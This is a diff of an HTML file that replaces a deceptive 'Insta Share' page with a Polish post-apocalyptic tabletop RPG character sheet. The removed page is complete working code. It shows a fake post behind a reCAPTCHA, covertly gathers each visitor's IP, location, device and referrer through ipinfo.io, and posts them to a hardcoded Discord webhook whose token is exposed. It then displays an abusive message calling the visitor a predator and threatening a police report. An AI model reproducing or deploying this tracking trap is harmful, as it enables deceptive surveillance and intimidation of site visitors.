@@ -1,145 +1,145 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pl">
 <head>
-  <meta charset="UTF-8" />
-  <title>Insta Share - Socialize, Communicate, Have fun!</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #fafafa;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 40px 20px;
-    }
-
-    .header {
-      font-size: 30px;
-      font-weight: 700;
-      color: #e1306c;
-      margin-bottom: 10px;
-    }
-
-    #statusMsg {
-      font-size: 16px;
-      color: #555;
-      margin-bottom: 20px;
-      text-align: center;
-    }
-
-    .g-recaptcha {
-      margin: 20px 0;
-    }
-
-    #fakeFeed {
-      display: none;
-      max-width: 600px;
-      background: #fff;
-      padding: 20px;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.05);
-      font-size: 16px;
-      color: #333;
-    }
-
-    #trapMessage {
-      display: none;
-      max-width: 600px;
-      background: #fff3f3;
-      padding: 20px;
-      border: 1px solid #ff9999;
-      border-radius: 10px;
-      font-size: 18px;
-      color: #b30000;
-      font-weight: bold;
-      text-align: center;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.05);
-    }
-
-    .consent {
-      font-size: 12px;
-      color: #777;
-      margin-top: 30px;
-      text-align: center;
-      max-width: 500px;
-      font-style: italic;
-    }
-  </style>
+<meta charset="UTF-8">
+<title>Ostatnie Światło - Karta Postaci</title>
+<style>
+  body { font-family: Arial, sans-serif; background: #1a1a1a; color: #f0f0f0; padding: 20px; }
+  h1, h2 { color: #ff6600; }
+  label { display: block; margin-top: 10px; }
+  input, select, textarea { width: 100%; padding: 5px; margin-top: 3px; background: #333; color: #f0f0f0; border: 1px solid #555; }
+  textarea { resize: vertical; }
+  .section { border: 1px solid #555; padding: 10px; margin-bottom: 20px; }
+  button { padding: 10px 20px; background: #ff6600; color: #1a1a1a; border: none; cursor: pointer; margin-top: 10px; }
+</style>
 </head>
 <body>
-  <div class="header">Insta Share</div>
-  <div id="statusMsg">Verifying post…</div>
+<h1>Karta Postaci: Ostatnie Światło</h1>
 
-  <div class="g-recaptcha" data-sitekey="6LeTg4ErAAAAAOJ4tpn7E_vvhRyRJZN-3LTvNw22" data-callback="onCaptchaSuccess"></div>
+<div class="section">
+  <label>Imię Postaci:
+    <input type="text" id="name">
+  </label>
+  <label>Klasa:
+    <select id="class" onchange="setClassDefaults()">
+      <option value="zwiadowca">Zwiadowca Ruin</option>
+      <option value="medyczka">Medyczka “Igła”</option>
+      <option value="zolnierz">Były Żołnierz</option>
+      <option value="inzynier">Inżynier</option>
+      <option value="mutant">Popiołowy “Dym”</option>
+    </select>
+  </label>
+  <label>HP:
+    <input type="number" id="hp">
+  </label>
+  <label>AC:
+    <input type="number" id="ac">
+  </label>
+</div>
 
-  <div id="fakeFeed">
-    <p>Loading post...</p>
-  </div>
+<div class="section">
+  <label>Umiejętności Aktywne:</label>
+  <textarea id="abilities" rows="4"></textarea>
 
-  <div id="trapMessage">
-    🚨 Well, this is awkward...<br><br>
-    No post here, just your busted, predator, sorry ass.<br>
-    Your IP, device, and location have been logged.<br><br>
-    The feds should be informed soon. 👮‍♂️
-  </div>
+  <label>Umiejętności Pasywne / Bonusy:</label>
+  <textarea id="passive" rows="3"></textarea>
 
-  <div class="consent">
-    To help keep this platform safe, we collect basic connection data (e.g., IP address, device info) to prevent abuse and report serious threats to appropriate authorities.
-  </div>
+  <label>Słabości / Debuffy:</label>
+  <textarea id="debuff" rows="3"></textarea>
+</div>
 
-  <script>
-    // Grab `id` from the URL (e.g. ?id=eva_princess)
-    const params = new URLSearchParams(window.location.search);
-    const userId = params.get("id") || "user";
+<div class="section">
+  <label>Mutacje / Efekty Promieniowania:</label>
+  <textarea id="mutation" rows="3"></textarea>
+</div>
 
-    document.getElementById('statusMsg').textContent = `Verify to see ${userId}'s post`;
+<button onclick="saveCharacter()">Zapisz / Generuj URL</button>
+<p id="urlOutput"></p>
 
-    function onCaptchaSuccess(token) {
-      const status = document.getElementById('statusMsg');
-      const feed = document.getElementById('fakeFeed');
-      const trap = document.getElementById('trapMessage');
-      const captcha = document.querySelector('.g-recaptcha');
+<script>
+// Default class data
+const classData = {
+  zwiadowca: {
+    hp: 16, ac: 12,
+    abilities: "Cichy Krok, Pułapka i Ewakuacja, Ostre Oko",
+    passive: "+2 Stealth, +1 Initiative",
+    debuff: "Fail stealth = alert nearby enemies"
+  },
+  medyczka: {
+    hp: 14, ac: 11,
+    abilities: "Prowizoryczna Operacja, Adrenalina, Uspokajający Ton",
+    passive: "Może rzucić reroll na Con lub Dex raz na sesję",
+    debuff: "Out of supplies = cannot heal"
+  },
+  zolnierz: {
+    hp: 20, ac: 15,
+    abilities: "Adrenalina Bojowa, Ostatni Nabój, Rozbicie Linii",
+    passive: "High melee damage",
+    debuff: "Low ammo = -2 damage"
+  },
+  inzynier: {
+    hp: 17, ac: 12,
+    abilities: "Pole Naprawy, Pułapka z Żelaza, Generator Ratunkowy",
+    passive: "Bonus to fixing traps",
+    debuff: "Fail tinkering = trap backfires"
+  },
+  mutant: {
+    hp: 15, ac: 12,
+    abilities: "Puls Popiołu, Cień w Tunelu, Instynkt Przetrwania",
+    passive: "+2 stealth in tunnels",
+    debuff: "Each Puls Popiołu use increases mutation side-effect"
+  }
+};
 
-      status.textContent = '✅ Verification successful. Loading post...';
-      captcha.style.display = 'none';
-      feed.style.display = 'block';
+// Set default values when class is selected
+function setClassDefaults() {
+  const cls = document.getElementById('class').value;
+  const data = classData[cls];
+  if(!data) return;
+  document.getElementById('hp').value = data.hp;
+  document.getElementById('ac').value = data.ac;
+  document.getElementById('abilities').value = data.abilities;
+  document.getElementById('passive').value = data.passive;
+  document.getElementById('debuff').value = data.debuff;
+}
 
-      fetch("https://ipinfo.io/json")
-        .then(res => res.json())
-        .then(ipData => {
-          const payload = {
-            content: `📥 Verified Visitor Logged
-🌍 IP: ${ipData.ip}
-📍 Location: ${ipData.city}, ${ipData.region}, ${ipData.country}
-🖥️ Device: ${navigator.userAgent}
-🔗 Referrer: ${document.referrer || "none"}
-🕒 Timestamp: ${new Date().toISOString()}
-✅ reCAPTCHA passed`
-          };
+// Save character to URL
+function saveCharacter() {
+  const data = {
+    name: document.getElementById('name').value,
+    class: document.getElementById('class').value,
+    hp: document.getElementById('hp').value,
+    ac: document.getElementById('ac').value,
+    abilities: document.getElementById('abilities').value,
+    passive: document.getElementById('passive').value,
+    debuff: document.getElementById('debuff').value,
+    mutation: document.getElementById('mutation').value
+  };
+  const encoded = encodeURIComponent(JSON.stringify(data));
+  const url = `${window.location.origin}${window.location.pathname}?c=${encoded}`;
+  document.getElementById('urlOutput').innerHTML = `<a href="${url}" target="_blank">${url}</a>`;
+}
 
-          return fetch("https://discord.com/api/webhooks/1393891795800297512/JCqANq-vPmpc1tY4KKCw7BPyfDcAawzduKZheJaORrqdyiPYrgEwZdB3RxRD00869CKY", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-          });
-        })
-        .then(() => {
-          setTimeout(() => {
-            feed.style.display = 'none';
-            trap.style.display = 'block';
-            status.textContent = '';
-          }, 2000);
-        })
-        .catch(() => {
-          trap.style.display = 'block';
-          status.textContent = '';
-          feed.style.display = 'none';
-        });
-    }
-  </script>
+// Load character from URL if present
+window.onload = function() {
+  const params = new URLSearchParams(window.location.search);
+  if(params.has('c')) {
+    try {
+      const data = JSON.parse(decodeURIComponent(params.get('c')));
+      document.getElementById('name').value = data.name || '';
+      document.getElementById('class').value = data.class || 'zwiadowca';
+      setClassDefaults(); // Fill defaults
+      document.getElementById('hp').value = data.hp || classData[data.class].hp;
+      document.getElementById('ac').value = data.ac || classData[data.class].ac;
+      document.getElementById('abilities').value = data.abilities || classData[data.class].abilities;
+      document.getElementById('passive').value = data.passive || classData[data.class].passive;
+      document.getElementById('debuff').value = data.debuff || classData[data.class].debuff;
+      document.getElementById('mutation').value = data.mutation || '';
+    } catch(e) { console.error("Nie można wczytać postaci:", e); }
+  } else {
+    setClassDefaults();
+  }
+};
+</script>
 </body>
 </html>
